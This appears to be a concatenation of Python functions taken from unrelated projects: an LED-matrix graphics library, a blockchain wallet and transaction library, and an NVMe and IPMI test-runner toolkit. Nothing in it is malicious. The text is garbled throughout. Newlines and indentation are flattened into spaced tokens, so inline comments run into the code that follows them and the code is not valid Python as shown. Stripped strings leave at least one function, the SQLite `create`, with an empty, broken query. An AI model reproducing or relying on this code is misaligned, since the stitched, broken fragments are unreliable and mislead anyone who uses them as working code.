def fill_triangle ( setter , x0 , y0 , x1 , y1 , x2 , y2 , color = None , aa = False ) : a = b = y = last = 0 if y0 > y1 : y0 , y1 = y1 , y0 x0 , x1 = x1 , x0 if y1 > y2 : y2 , y1 = y1 , y2 x2 , x1 = x1 , x2 if y0 > y1 : y0 , y1 = y1 , y0 x0 , x1 = x1 , x0 if y0 == y2 : # Handle awkward all-on-same-line case as its own thing a = b = x0 if x1 < a : a = x1 elif x1 > b : b = x1 if x2 < a : a = x2 elif x2 > b : b = x2 _draw_fast_hline ( setter , a , y0 , b - a + 1 , color , aa ) dx01 = x1 - x0 dy01 = y1 - y0 dx02 = x2 - x0 dy02 = y2 - y0 dx12 = x2 - x1 dy12 = y2 - y1 sa = 0 sb = 0 # For upper part of triangle, find scanline crossings for segments # 0-1 and 0-2.  If y1=y2 (flat-bottomed triangle), the scanline y1 # is included here (and second loop will be skipped, avoiding a /0 # error there), otherwise scanline y1 is skipped here and handled # in the second loop...which also avoids a /0 error here if y0=y1 # (flat-topped triangle). if y1 == y2 : last = y1 # include y1 scanline else : last = y1 - 1 # skip it for y in range ( y , last + 1 ) : a = x0 + sa / dy01 b = x0 + sb / dy02 sa += dx01 sb += dx02 if a > b : a , b = b , a _draw_fast_hline ( setter , a , y , b - a + 1 , color , aa ) # For lower part of triangle, find scanline crossings for segments # 0-2 and 1-2.  This loop is skipped if y1=y2. sa = dx12 * ( y - y1 ) sb = dx02 * ( y - y0 ) for y in range ( y , y2 + 1 ) : a = x1 + sa / dy12 b = x0 + sb / dy02 sa += dx12 sb += dx02 if a > b : a , b = b , a _draw_fast_hline ( setter , a , y , b - a + 1 , color , aa )
def all_named_colors ( ) : yield from _TO_COLOR_USER . items ( ) for name , color in _TO_COLOR . items ( ) : if name not in _TO_COLOR_USER : yield name , color
def contains ( x ) : if isinstance ( x , str ) : x = canonical_name ( x ) return x in _TO_COLOR_USER or x in _TO_COLOR else : x = tuple ( x ) return x in _TO_NAME_USER or x in _TO_NAME
def make_segments ( strip , length ) : if len ( strip ) % length : raise ValueError ( 'The length of strip must be a multiple of length' ) s = [ ] try : while True : s . append ( s [ - 1 ] . next ( length ) if s else Segment ( strip , length ) ) except ValueError : return s
def next ( self , length ) : return Segment ( self . strip , length , self . offset + self . length )
def start ( self , threaded = None ) : if threaded is not None : self . threaded = threaded run = { 'run' : { 'threaded' : False } } self . project = project . project ( self . desc , run , root_file = self . project_file ) self . _run = self . project . run self . _runner . start ( self . threaded )
def stop ( self = None ) : if not self : instance = getattr ( Runner . instance ( ) , 'builder' , None ) self = instance and instance ( ) if not self : return self . _runner . stop ( ) if self . project : self . project . stop ( ) self . project = None
def simpixel ( new = 0 , autoraise = True ) : simpixel_driver . open_browser ( new = new , autoraise = autoraise )
def euclidean ( c1 , c2 ) : diffs = ( ( i - j ) for i , j in zip ( c1 , c2 ) ) return sum ( x * x for x in diffs )
def set_one ( desc , name , value ) : old_value = desc . get ( name ) if old_value is None : raise KeyError ( 'No section "%s"' % name ) if value is None : value = type ( old_value ) ( ) elif name in CLASS_SECTIONS : if isinstance ( value , str ) : value = { 'typename' : aliases . resolve ( value ) } elif isinstance ( value , type ) : value = { 'typename' : class_name . class_name ( value ) } elif not isinstance ( value , dict ) : raise TypeError ( 'Expected dict, str or type, got "%s"' % value ) typename = value . get ( 'typename' ) if typename : s = 's' if name == 'driver' else '' path = 'bibliopixel.' + name + s importer . import_symbol ( typename , path ) elif name == 'shape' : if not isinstance ( value , ( list , int , tuple , str ) ) : raise TypeError ( 'Expected shape, got "%s"' % value ) elif type ( old_value ) is not type ( value ) : raise TypeError ( 'Expected %s but got "%s" of type %s' % ( type ( old_value ) , value , type ( value ) ) ) desc [ name ] = value
def update ( desc , other = None , * * kwds ) : other = other and _as_dict ( other ) or { } for i in other , kwds : for k , v in i . items ( ) : if isinstance ( v , dict ) : # Only for dicts, merge instead of overwriting old_v = desc [ k ] for k2 , v2 in v . items ( ) : if v2 is None : old_v . pop ( k2 , None ) else : old_v [ k2 ] = v2 else : set_one ( desc , k , v )
def to_color ( c ) : if isinstance ( c , numbers . Number ) : return c , c , c if not c : raise ValueError ( 'Cannot create color from empty "%s"' % c ) if isinstance ( c , str ) : return name_to_color ( c ) if isinstance ( c , list ) : c = tuple ( c ) if isinstance ( c , tuple ) : if len ( c ) > 3 : return c [ : 3 ] while len ( c ) < 3 : c += ( c [ - 1 ] , ) return c raise ValueError ( 'Cannot create color from "%s"' % c )
def convert_mode ( image , mode = 'RGB' ) : deprecated . deprecated ( 'util.gif.convert_model' ) return image if ( image . mode == mode ) else image . convert ( mode = mode )
def image_to_colorlist ( image , container = list ) : deprecated . deprecated ( 'util.gif.image_to_colorlist' ) return container ( convert_mode ( image ) . getdata ( ) )
def animated_gif_to_colorlists ( image , container = list ) : deprecated . deprecated ( 'util.gif.animated_gif_to_colorlists' ) from PIL import ImageSequence it = ImageSequence . Iterator ( image ) return [ image_to_colorlist ( i , container ) for i in it ]
def opener ( ip_address , port , delay = 1 ) : global WEBPAGE_OPENED if WEBPAGE_OPENED : return WEBPAGE_OPENED = True raw_opener ( ip_address , port , delay )
def raw_opener ( ip_address , port , delay = 1 ) : def target ( ) : time . sleep ( delay ) url = 'http://%s:%d' % ( ip_address , port ) webbrowser . open ( url , new = 0 , autoraise = True ) threading . Thread ( target = target , daemon = True ) . start ( )
def start ( self , threaded ) : self . stop ( ) self . __class__ . _INSTANCE = weakref . ref ( self ) self . is_running = True if threaded : self . thread = runnable . LoopThread ( ) self . thread . run_once = self . _target self . thread . start ( ) else : self . _target ( )
def show_image ( setter , width , height , image_path = '' , image_obj = None , offset = ( 0 , 0 ) , bgcolor = COLORS . Off , brightness = 255 ) : bgcolor = color_scale ( bgcolor , brightness ) img = image_obj if image_path and not img : from PIL import Image img = Image . open ( image_path ) elif not img : raise ValueError ( 'Must provide either image_path or image_obj' ) w = min ( width - offset [ 0 ] , img . size [ 0 ] ) h = min ( height - offset [ 1 ] , img . size [ 1 ] ) ox = offset [ 0 ] oy = offset [ 1 ] for x in range ( ox , w + ox ) : for y in range ( oy , h + oy ) : r , g , b , a = ( 0 , 0 , 0 , 255 ) rgba = img . getpixel ( ( x - ox , y - oy ) ) if isinstance ( rgba , int ) : raise ValueError ( 'Image must be in RGB or RGBA format!' ) if len ( rgba ) == 3 : r , g , b = rgba elif len ( rgba ) == 4 : r , g , b , a = rgba else : raise ValueError ( 'Image must be in RGB or RGBA format!' ) if a == 0 : r , g , b = bgcolor else : r , g , b = color_scale ( ( r , g , b ) , a ) if brightness != 255 : r , g , b = color_scale ( ( r , g , b ) , brightness ) setter ( x , y , ( r , g , b ) )
def showImage ( layout , imagePath = "" , imageObj = None , offset = ( 0 , 0 ) , bgcolor = COLORS . Off , brightness = 255 ) : if not isinstance ( layout , Matrix ) : raise RuntimeError ( "Must use Matrix with showImage!" ) layout . all_off ( ) return show_image ( layout . set , layout . width , layout . height , imagePath , imageObj , offset , bgcolor , brightness )
def loadImage ( layout , imagePath = "" , imageObj = None , offset = ( 0 , 0 ) , bgcolor = COLORS . Off , brightness = 255 ) : if not isinstance ( layout , Matrix ) : raise RuntimeError ( "Must use Matrix with loadImage!" ) texture = [ [ COLORS . Off for x in range ( layout . width ) ] for y in range ( layout . height ) ] def setter ( x , y , pixel ) : if y >= 0 and x >= 0 : texture [ y ] [ x ] = pixel show_image ( setter , layout . width , layout . height , imagePath , imageObj , offset , bgcolor , brightness ) return texture
def serpentine_x ( x , y , matrix ) : if y % 2 : return matrix . columns - 1 - x , y return x , y
def serpentine_y ( x , y , matrix ) : if x % 2 : return x , matrix . rows - 1 - y return x , y
def colors_no_palette ( colors = None , * * kwds ) : if isinstance ( colors , str ) : colors = _split_colors ( colors ) else : colors = to_triplets ( colors or ( ) ) colors = ( color ( c ) for c in colors or ( ) ) return palette . Palette ( colors , * * kwds )
def make_matrix_coord_map ( dx , dy , serpentine = True , offset = 0 , rotation = 0 , y_flip = False ) : result = [ ] for y in range ( dy ) : if not serpentine or y % 2 == 0 : result . append ( [ ( dx * y ) + x + offset for x in range ( dx ) ] ) else : result . append ( [ dx * ( y + 1 ) - 1 - x + offset for x in range ( dx ) ] ) result = rotate_and_flip ( result , rotation , y_flip ) return result
def make_object ( * args , typename = None , python_path = None , datatype = None , * * kwds ) : datatype = datatype or import_symbol ( typename , python_path ) field_types = getattr ( datatype , 'FIELD_TYPES' , fields . FIELD_TYPES ) return datatype ( * args , * * fields . component ( kwds , field_types ) )
def index ( self , i , length = None ) : if self . begin <= i <= self . end : index = i - self . BEGIN - self . offset if length is None : length = self . full_range ( ) else : length = min ( length , self . full_range ( ) ) if 0 <= index < length : return index
def copy ( self ) : return self . __class__ ( amount = self [ "amount" ] , asset = self [ "asset" ] . copy ( ) , blockchain_instance = self . blockchain , )
def upgrade ( self ) : # pragma: no cover assert callable ( self . blockchain . upgrade_account ) return self . blockchain . upgrade_account ( account = self )
def whitelist ( self , account ) : # pragma: no cover assert callable ( self . blockchain . account_whitelist ) return self . blockchain . account_whitelist ( account , lists = [ "white" ] , account = self )
def blacklist ( self , account ) : # pragma: no cover assert callable ( self . blockchain . account_whitelist ) return self . blockchain . account_whitelist ( account , lists = [ "black" ] , account = self )
def nolist ( self , account ) : # pragma: no cover assert callable ( self . blockchain . account_whitelist ) return self . blockchain . account_whitelist ( account , lists = [ ] , account = self )
def recover_public_key ( digest , signature , i , message = None ) : # See http: //www.secg.org/download/aid-780/sec1-v2.pdf section 4.1.6 primarily curve = ecdsa . SECP256k1 . curve G = ecdsa . SECP256k1 . generator order = ecdsa . SECP256k1 . order yp = i % 2 r , s = ecdsa . util . sigdecode_string ( signature , order ) # 1.1 x = r + ( i // 2 ) * order # 1.3. This actually calculates for either effectively 02||X or 03||X depending on 'k' instead of always for 02||X as specified. # This substitutes for the lack of reversing R later on. -R actually is defined to be just flipping the y-coordinate in the elliptic curve. alpha = ( ( x * x * x ) + ( curve . a ( ) * x ) + curve . b ( ) ) % curve . p ( ) beta = ecdsa . numbertheory . square_root_mod_prime ( alpha , curve . p ( ) ) y = beta if ( beta - yp ) % 2 == 0 else curve . p ( ) - beta # 1.4 Constructor of Point is supposed to check if nR is at infinity. R = ecdsa . ellipticcurve . Point ( curve , x , y , order ) # 1.5 Compute e e = ecdsa . util . string_to_number ( digest ) # 1.6 Compute Q = r^-1(sR - eG) Q = ecdsa . numbertheory . inverse_mod ( r , order ) * ( s * R + ( - e % order ) * G ) if SECP256K1_MODULE == "cryptography" and message is not None : if not isinstance ( message , bytes ) : message = bytes ( message , "utf-8" ) # pragma: no cover sigder = encode_dss_signature ( r , s ) public_key = ec . EllipticCurvePublicNumbers ( Q . _Point__x , Q . _Point__y , ec . SECP256K1 ( ) ) . public_key ( default_backend ( ) ) public_key . verify ( sigder , message , ec . ECDSA ( hashes . SHA256 ( ) ) ) return public_key else : # Not strictly necessary, but let's verify the message for paranoia's sake. if not ecdsa . VerifyingKey . from_public_point ( Q , curve = ecdsa . SECP256k1 ) . verify_digest ( signature , digest , sigdecode = ecdsa . util . sigdecode_string ) : # pragma: no cover return None # pragma: no cover return ecdsa . VerifyingKey . from_public_point ( Q , curve = ecdsa . SECP256k1 )
def refresh ( self ) : asset = self . blockchain . rpc . get_asset ( self . identifier ) if not asset : raise AssetDoesNotExistsException ( self . identifier ) super ( Asset , self ) . __init__ ( asset , blockchain_instance = self . blockchain ) if self . full : if "bitasset_data_id" in asset : self [ "bitasset_data" ] = self . blockchain . rpc . get_object ( asset [ "bitasset_data_id" ] ) self [ "dynamic_asset_data" ] = self . blockchain . rpc . get_object ( asset [ "dynamic_asset_data_id" ] )
def formatTime ( t ) : if isinstance ( t , float ) : return datetime . utcfromtimestamp ( t ) . strftime ( timeFormat ) if isinstance ( t , datetime ) : return t . strftime ( timeFormat )
def getOperationNameForId ( i : int ) : assert isinstance ( i , ( int ) ) , "This method expects an integer argument" for key in operations : if int ( operations [ key ] ) is int ( i ) : return key raise ValueError ( "Unknown Operation ID %d" % i )
def unlocked ( self ) : if self . password is not None : return bool ( self . password ) else : if ( "UNLOCK" in os . environ and os . environ [ "UNLOCK" ] and self . config_key in self . config and self . config [ self . config_key ] ) : log . debug ( "Trying to use environmental " "variable to unlock wallet" ) self . unlock ( os . environ . get ( "UNLOCK" ) ) return bool ( self . password ) return False
def _decrypt_masterpassword ( self ) : aes = AESCipher ( self . password ) checksum , encrypted_master = self . config [ self . config_key ] . split ( "$" ) try : decrypted_master = aes . decrypt ( encrypted_master ) except Exception : self . _raise_wrongmasterpassexception ( ) if checksum != self . _derive_checksum ( decrypted_master ) : self . _raise_wrongmasterpassexception ( ) self . decrypted_master = decrypted_master
def change_password ( self , newpassword ) : if not self . unlocked ( ) : raise WalletLocked self . password = newpassword self . _save_encrypted_masterpassword ( )
def _derive_y_from_x ( self , x , is_even ) : curve = ecdsa . SECP256k1 . curve # The curve equation over F_p is: #   y^2 = x^3 + ax + b a , b , p = curve . a ( ) , curve . b ( ) , curve . p ( ) alpha = ( pow ( x , 3 , p ) + a * x + b ) % p beta = ecdsa . numbertheory . square_root_mod_prime ( alpha , p ) if ( beta % 2 ) == is_even : beta = p - beta return beta
def point ( self ) : string = unhexlify ( self . unCompressed ( ) ) return ecdsa . VerifyingKey . from_string ( string [ 1 : ] , curve = ecdsa . SECP256k1 ) . pubkey . point
def child ( self , offset256 ) : a = bytes ( self ) + offset256 s = hashlib . sha256 ( a ) . digest ( ) return self . add ( s )
def from_privkey ( cls , privkey , prefix = None ) : privkey = PrivateKey ( privkey , prefix = prefix or Prefix . prefix ) secret = unhexlify ( repr ( privkey ) ) order = ecdsa . SigningKey . from_string ( secret , curve = ecdsa . SECP256k1 ) . curve . generator . order ( ) p = ecdsa . SigningKey . from_string ( secret , curve = ecdsa . SECP256k1 ) . verifying_key . pubkey . point x_str = ecdsa . util . number_to_string ( p . x ( ) , order ) # y_str = ecdsa.util.number_to_string(p.y(), order) compressed = hexlify ( chr ( 2 + ( p . y ( ) & 1 ) ) . encode ( "ascii" ) + x_str ) . decode ( "ascii" ) # uncompressed = hexlify( #    chr(4).encode('ascii') + x_str + y_str).decode('ascii') return cls ( compressed , prefix = prefix or Prefix . prefix )
def child ( self , offset256 ) : a = bytes ( self . pubkey ) + offset256 s = hashlib . sha256 ( a ) . digest ( ) return self . derive_from_seed ( s )
def getOperationNameForId ( self , i ) : for key in self . ops : if int ( self . ops [ key ] ) is int ( i ) : return key raise ValueError ( "Unknown Operation ID %d" % i )
def find_next ( self ) : if int ( self . num_retries ) < 0 : # pragma: no cover self . _cnt_retries += 1 sleeptime = ( self . _cnt_retries - 1 ) * 2 if self . _cnt_retries < 10 else 10 if sleeptime : log . warning ( "Lost connection to node during rpcexec(): %s (%d/%d) " % ( self . url , self . _cnt_retries , self . num_retries ) + "Retrying in %d seconds" % sleeptime ) sleep ( sleeptime ) return next ( self . urls ) urls = [ k for k , v in self . _url_counter . items ( ) if ( # Only provide URLS if num_retries is bigger equal 0, # i.e. we want to do reconnects at all int ( self . num_retries ) >= 0 # the counter for this host/endpoint should be smaller than # num_retries and v <= self . num_retries # let's not retry with the same URL *if* we have others # available and ( k != self . url or len ( self . _url_counter ) == 1 ) ) ] if not len ( urls ) : raise NumRetriesReached url = urls [ 0 ] return url
def reset_counter ( self ) : self . _cnt_retries = 0 for i in self . _url_counter : self . _url_counter [ i ] = 0
def _haveKey ( self , key ) : query = ( "SELECT {} FROM {} WHERE {}=?" . format ( self . __value__ , self . __tablename__ , self . __key__ ) , ( key , ) , ) connection = sqlite3 . connect ( self . sqlite_file ) cursor = connection . cursor ( ) cursor . execute ( * query ) return True if cursor . fetchone ( ) else False
def items ( self ) : query = "SELECT {}, {} from {}" . format ( self . __key__ , self . __value__ , self . __tablename__ ) connection = sqlite3 . connect ( self . sqlite_file ) cursor = connection . cursor ( ) cursor . execute ( query ) r = [ ] for key , value in cursor . fetchall ( ) : r . append ( ( key , value ) ) return r
def exists ( self ) : query = ( "SELECT name FROM sqlite_master " + "WHERE type='table' AND name=?" , ( self . __tablename__ , ) , ) connection = sqlite3 . connect ( self . sqlite_file ) cursor = connection . cursor ( ) cursor . execute ( * query ) return True if cursor . fetchone ( ) else False
def create ( self ) : # pragma: no cover query = ( ) . format ( self . __tablename__ , self . __key__ , self . __value__ ) connection = sqlite3 . connect ( self . sqlite_file ) cursor = connection . cursor ( ) cursor . execute ( query ) connection . commit ( )
def get_raw ( self ) : if not self . ops : return ops = [ self . operations . Op_wrapper ( op = o ) for o in list ( self . ops ) ] proposer = self . account_class ( self . proposer , blockchain_instance = self . blockchain ) data = { "fee" : { "amount" : 0 , "asset_id" : "1.3.0" } , "fee_paying_account" : proposer [ "id" ] , "expiration_time" : formatTimeFromNow ( self . proposal_expiration ) , "proposed_ops" : [ o . json ( ) for o in ops ] , "extensions" : [ ] , } if self . proposal_review : data . update ( { "review_period_seconds" : self . proposal_review } ) ops = self . operations . Proposal_create ( * * data ) return self . operation_class ( ops )
def json ( self ) : if not self . _is_constructed ( ) or self . _is_require_reconstruction ( ) : self . constructTx ( ) return dict ( self )
def appendWif ( self , wif ) : if wif : try : self . privatekey_class ( wif ) self . wifs . add ( wif ) except Exception : raise InvalidWifError
def set_fee_asset ( self , fee_asset ) : if isinstance ( fee_asset , self . amount_class ) : self . fee_asset_id = fee_asset [ "id" ] elif isinstance ( fee_asset , self . asset_class ) : self . fee_asset_id = fee_asset [ "id" ] elif fee_asset : self . fee_asset_id = fee_asset else : self . fee_asset_id = "1.3.0"
def verify_authority ( self ) : try : if not self . blockchain . rpc . verify_authority ( self . json ( ) ) : raise InsufficientAuthorityError except Exception as e : raise e
def clear ( self ) : self . ops = [ ] self . wifs = set ( ) self . signing_accounts = [ ] # This makes sure that _is_constructed will return False afterwards self [ "expiration" ] = None dict . __init__ ( self , { } )
def id ( self ) : # Store signatures temporarily since they are not part of # transaction id sigs = self . data [ "signatures" ] self . data . pop ( "signatures" , None ) # Generage Hash of the seriliazed version h = hashlib . sha256 ( bytes ( self ) ) . digest ( ) # recover signatures self . data [ "signatures" ] = sigs # Return properly truncated tx hash return hexlify ( h [ : 20 ] ) . decode ( "ascii" )
def unlock ( self , pwd ) : if self . store . is_encrypted ( ) : return self . store . unlock ( pwd )
def newWallet ( self , pwd ) : if self . created ( ) : raise WalletExists ( "You already have created a wallet!" ) self . store . unlock ( pwd )
def addPrivateKey ( self , wif ) : try : pub = self . publickey_from_wif ( wif ) except Exception : raise InvalidWifError ( "Invalid Key format!" ) if str ( pub ) in self . store : raise KeyAlreadyInStoreException ( "Key already in the store" ) self . store . add ( str ( wif ) , str ( pub ) )
def removeAccount ( self , account ) : accounts = self . getAccounts ( ) for a in accounts : if a [ "name" ] == account : self . store . delete ( a [ "pubkey" ] )
def getOwnerKeyForAccount ( self , name ) : account = self . rpc . get_account ( name ) for authority in account [ "owner" ] [ "key_auths" ] : key = self . getPrivateKeyForPublicKey ( authority [ 0 ] ) if key : return key raise KeyNotFound
def getMemoKeyForAccount ( self , name ) : account = self . rpc . get_account ( name ) key = self . getPrivateKeyForPublicKey ( account [ "options" ] [ "memo_key" ] ) if key : return key return False
def getActiveKeyForAccount ( self , name ) : account = self . rpc . get_account ( name ) for authority in account [ "active" ] [ "key_auths" ] : try : return self . getPrivateKeyForPublicKey ( authority [ 0 ] ) except Exception : pass return False
def getAccountFromPrivateKey ( self , wif ) : pub = self . publickey_from_wif ( wif ) return self . getAccountFromPublicKey ( pub )
def getAccountsFromPublicKey ( self , pub ) : names = self . rpc . get_key_references ( [ str ( pub ) ] ) [ 0 ] for name in names : yield name
def getAccountFromPublicKey ( self , pub ) : # FIXME, this only returns the first associated key. # If the key is used by multiple accounts, this # will surely lead to undesired behavior names = list ( self . getAccountsFromPublicKey ( str ( pub ) ) ) if names : return names [ 0 ]
def getAccounts ( self ) : pubkeys = self . getPublicKeys ( ) accounts = [ ] for pubkey in pubkeys : # Filter those keys not for our network if pubkey [ : len ( self . prefix ) ] == self . prefix : accounts . extend ( self . getAccountsFromPublicKey ( pubkey ) ) return accounts
def unlock_wallet ( self , * args , * * kwargs ) : self . blockchain . wallet . unlock ( * args , * * kwargs ) return self
def cmd ( command ) : env ( ) ipmi = cij . env_to_dict ( PREFIX , EXPORTED + REQUIRED ) command = "ipmitool -U %s -P %s -H %s -p %s %s" % ( ipmi [ "USER" ] , ipmi [ "PASS" ] , ipmi [ "HOST" ] , ipmi [ "PORT" ] , command ) cij . info ( "ipmi.command: %s" % command ) return cij . util . execute ( command , shell = True , echo = True )
def regex_find ( pattern , content ) : find = re . findall ( pattern , content ) if not find : cij . err ( "pattern <%r> is invalid, no matches!" % pattern ) cij . err ( "content: %r" % content ) return '' if len ( find ) >= 2 : cij . err ( "pattern <%r> is too simple, matched more than 2!" % pattern ) cij . err ( "content: %r" % content ) return '' return find [ 0 ]
def env ( ) : if cij . ssh . env ( ) : cij . err ( "board.env: invalid SSH environment" ) return 1 board = cij . env_to_dict ( PREFIX , REQUIRED ) # Verify REQUIRED variables if board is None : cij . err ( "board.env: invalid BOARD environment" ) return 1 board [ "CLASS" ] = "_" . join ( [ board [ r ] for r in REQUIRED [ : - 1 ] ] ) board [ "IDENT" ] = "-" . join ( [ board [ "CLASS" ] , board [ "ALIAS" ] ] ) cij . env_export ( PREFIX , EXPORTED , board ) # Export EXPORTED variables return 0
def cat_file ( path ) : cmd = [ "cat" , path ] status , stdout , _ = cij . ssh . command ( cmd , shell = True , echo = True ) if status : raise RuntimeError ( "cij.nvme.env: cat %s failed" % path ) return stdout . strip ( )
def env ( ) : if cij . ssh . env ( ) : cij . err ( "cij.nvme.env: invalid SSH environment" ) return 1 nvme = cij . env_to_dict ( PREFIX , REQUIRED ) nvme [ "DEV_PATH" ] = os . path . join ( "/dev" , nvme [ "DEV_NAME" ] ) # get version, chunks, luns and chs try : sysfs = os . path . join ( "/sys/class/block" , nvme [ "DEV_NAME" ] , "lightnvm" ) nvme [ "LNVM_VERSION" ] = cat_file ( os . path . join ( sysfs , "version" ) ) if nvme [ "LNVM_VERSION" ] == "2.0" : luns = "punits" chs = "groups" elif nvme [ "LNVM_VERSION" ] == "1.2" : luns = "num_luns" chs = "num_channels" else : raise RuntimeError ( "cij.nvme.env: invalid lnvm version: %s" % nvme [ "LNVM_VERSION" ] ) nvme [ "LNVM_NUM_CHUNKS" ] = cat_file ( os . path . join ( sysfs , "chunks" ) ) nvme [ "LNVM_NUM_LUNS" ] = cat_file ( os . path . join ( sysfs , luns ) ) nvme [ "LNVM_NUM_CHS" ] = cat_file ( os . path . join ( sysfs , chs ) ) nvme [ "LNVM_TOTAL_LUNS" ] = str ( int ( nvme [ "LNVM_NUM_LUNS" ] ) * int ( nvme [ "LNVM_NUM_CHS" ] ) ) nvme [ "LNVM_TOTAL_CHUNKS" ] = str ( int ( nvme [ "LNVM_TOTAL_LUNS" ] ) * int ( nvme [ "LNVM_NUM_CHUNKS" ] ) ) # get spec version by identify namespace data struct if nvme [ "LNVM_VERSION" ] == "2.0" : cmd = [ "nvme" , "id-ctrl" , nvme [ "DEV_PATH" ] , "--raw-binary" ] status , stdout , _ = cij . ssh . command ( cmd , shell = True ) if status : raise RuntimeError ( "cij.nvme.env: nvme id-ctrl fail" ) buff = cij . bin . Buffer ( types = IdentifyCDS , length = 1 ) buff . memcopy ( stdout ) if buff [ 0 ] . VS [ 1023 ] == 0x5a : nvme [ "SPEC_VERSION" ] = "Denali" else : nvme [ "SPEC_VERSION" ] = "Spec20" else : nvme [ "SPEC_VERSION" ] = "Spec12" # get chunk meta information nvme [ "LNVM_CHUNK_META_LENGTH" ] = str ( get_sizeof_descriptor_table ( nvme [ "SPEC_VERSION" ] ) ) nvme [ "LNVM_CHUNK_META_SIZE" ] = str ( int ( nvme [ "LNVM_CHUNK_META_LENGTH" ] ) * int ( nvme [ "LNVM_TOTAL_CHUNKS" ] ) ) except StandardError : traceback . print_exc ( ) return 1 cij . env_export ( PREFIX , EXPORTED , nvme ) return 0
def fmt ( lbaf = 3 ) : if env ( ) : cij . err ( "cij.nvme.exists: Invalid NVMe ENV." ) return 1 nvme = cij . env_to_dict ( PREFIX , EXPORTED + REQUIRED ) cmd = [ "nvme" , "format" , nvme [ "DEV_PATH" ] , "-l" , str ( lbaf ) ] rcode , _ , _ = cij . ssh . command ( cmd , shell = True ) return rcode
def get_meta ( offset , length , output ) : if env ( ) : cij . err ( "cij.nvme.meta: Invalid NVMe ENV." ) return 1 nvme = cij . env_to_dict ( PREFIX , EXPORTED + REQUIRED ) max_size = 0x40000 with open ( output , "wb" ) as fout : for off in range ( offset , length , max_size ) : size = min ( length - off , max_size ) cmd = [ "nvme get-log" , nvme [ "DEV_PATH" ] , "-i 0xca" , "-o 0x%x" % off , "-l 0x%x" % size , "-b" ] status , stdout , _ = cij . ssh . command ( cmd , shell = True ) if status : cij . err ( "cij.nvme.meta: Error get chunk meta" ) return 1 fout . write ( stdout ) return 0
def env ( ) : if cij . ssh . env ( ) : cij . err ( "cij.lnvm.env: invalid SSH environment" ) return 1 lnvm = cij . env_to_dict ( PREFIX , REQUIRED ) nvme = cij . env_to_dict ( "NVME" , [ "DEV_NAME" ] ) if "BGN" not in lnvm . keys ( ) : cij . err ( "cij.lnvm.env: invalid LNVM_BGN" ) return 1 if "END" not in lnvm . keys ( ) : cij . err ( "cij.lnvm.env: invalid LNVM_END" ) return 1 if "DEV_TYPE" not in lnvm . keys ( ) : cij . err ( "cij.lnvm.env: invalid LNVM_DEV_TYPE" ) return 1 lnvm [ "DEV_NAME" ] = "%sb%03de%03d" % ( nvme [ "DEV_NAME" ] , int ( lnvm [ "BGN" ] ) , int ( lnvm [ "END" ] ) ) lnvm [ "DEV_PATH" ] = "/dev/%s" % lnvm [ "DEV_NAME" ] cij . env_export ( PREFIX , EXPORTED , lnvm ) return 0
def compare ( buf_a , buf_b , ignore ) : for field in getattr ( buf_a , '_fields_' ) : name , types = field [ 0 ] , field [ 1 ] if name in ignore : continue val_a = getattr ( buf_a , name ) val_b = getattr ( buf_b , name ) if isinstance ( types , ( type ( Union ) , type ( Structure ) ) ) : if compare ( val_a , val_b , ignore ) : return 1 elif isinstance ( types , type ( Array ) ) : for i , _ in enumerate ( val_a ) : if isinstance ( types , ( type ( Union ) , type ( Structure ) ) ) : if compare ( val_a [ i ] , val_b [ i ] , ignore ) : return 1 else : if val_a [ i ] != val_b [ i ] : return 1 else : if val_a != val_b : return 1 return 0
def memcopy ( self , stream , offset = 0 , length = float ( "inf" ) ) : data = [ ord ( i ) for i in list ( stream ) ] size = min ( length , len ( data ) , self . m_size ) buff = cast ( self . m_buf , POINTER ( c_uint8 ) ) for i in range ( size ) : buff [ offset + i ] = data [ i ]
def write ( self , path ) : with open ( path , "wb" ) as fout : fout . write ( self . m_buf )
def read ( self , path ) : with open ( path , "rb" ) as fout : memmove ( self . m_buf , fout . read ( self . m_size ) , self . m_size )
def is_bad_chunk ( self , chk , yml ) : cs = self . get_chunk_status ( chk , yml ) if cs >= 8 : return True return False
def is_free_chunk ( self , chk ) : cs = self . get_chunk_status ( chk ) if cs & 0x1 != 0 : return True return False
def is_closed_chunk ( self , chk ) : cs = self . get_chunk_status ( chk ) if cs & 0x2 != 0 : return True return False
def is_open_chunk ( self , chk ) : cs = self . get_chunk_status ( chk ) if cs & 0x4 != 0 : return True return False
def env ( ) : if cij . ssh . env ( ) : cij . err ( "cij.block.env: invalid SSH environment" ) return 1 block = cij . env_to_dict ( PREFIX , REQUIRED ) block [ "DEV_PATH" ] = "/dev/%s" % block [ "DEV_NAME" ] cij . env_export ( PREFIX , EXPORTED , block ) return 0
def script_run ( trun , script ) : if trun [ "conf" ] [ "VERBOSE" ] : cij . emph ( "rnr:script:run { script: %s }" % script ) cij . emph ( "rnr:script:run:evars: %s" % script [ "evars" ] ) launchers = { ".py" : "python" , ".sh" : "source" } ext = os . path . splitext ( script [ "fpath" ] ) [ - 1 ] if not ext in launchers . keys ( ) : cij . err ( "rnr:script:run { invalid script[\"fpath\"]: %r }" % script [ "fpath" ] ) return 1 launch = launchers [ ext ] with open ( script [ "log_fpath" ] , "a" ) as log_fd : log_fd . write ( "# script_fpath: %r\n" % script [ "fpath" ] ) log_fd . flush ( ) bgn = time . time ( ) cmd = [ 'bash' , '-c' , 'CIJ_ROOT=$(cij_root) && ' 'source $CIJ_ROOT/modules/cijoe.sh && ' 'source %s && ' 'CIJ_TEST_RES_ROOT="%s" %s %s ' % ( trun [ "conf" ] [ "ENV_FPATH" ] , script [ "res_root" ] , launch , script [ "fpath" ] ) ] if trun [ "conf" ] [ "VERBOSE" ] > 1 : cij . emph ( "rnr:script:run { cmd: %r }" % " " . join ( cmd ) ) evars = os . environ . copy ( ) evars . update ( { k : str ( script [ "evars" ] [ k ] ) for k in script [ "evars" ] } ) process = Popen ( cmd , stdout = log_fd , stderr = STDOUT , cwd = script [ "res_root" ] , env = evars ) process . wait ( ) script [ "rcode" ] = process . returncode script [ "wallc" ] = time . time ( ) - bgn if trun [ "conf" ] [ "VERBOSE" ] : cij . emph ( "rnr:script:run { wallc: %02f }" % script [ "wallc" ] ) cij . emph ( "rnr:script:run { rcode: %r } " % script [ "rcode" ] , script [ "rcode" ] ) return script [ "rcode" ]
def trun_to_file ( trun , fpath = None ) : if fpath is None : fpath = yml_fpath ( trun [ "conf" ] [ "OUTPUT" ] ) with open ( fpath , 'w' ) as yml_file : data = yaml . dump ( trun , explicit_start = True , default_flow_style = False ) yml_file . write ( data )
